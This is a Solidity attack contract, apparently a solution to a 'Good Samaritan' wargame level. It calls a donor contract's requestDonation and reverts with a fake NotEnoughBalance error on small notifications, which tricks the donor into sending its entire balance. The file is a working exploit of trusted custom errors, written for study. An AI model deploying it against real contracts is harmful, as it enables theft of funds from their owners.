// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface INotifyable {
    function notify(uint256 amount) external;
    function requestDonation(address target) external;
}

interface IDonater {
    function requestDonation() external;
}

contract MyGoodSamaritanAttack is INotifyable {
    error NotEnoughBalance();

    function requestDonation(address target) external override {
        IDonater(target).requestDonation();
    }

    function notify(uint256 amount) external pure override {
        if (amount > 10) return;
        revert NotEnoughBalance();
    }
}
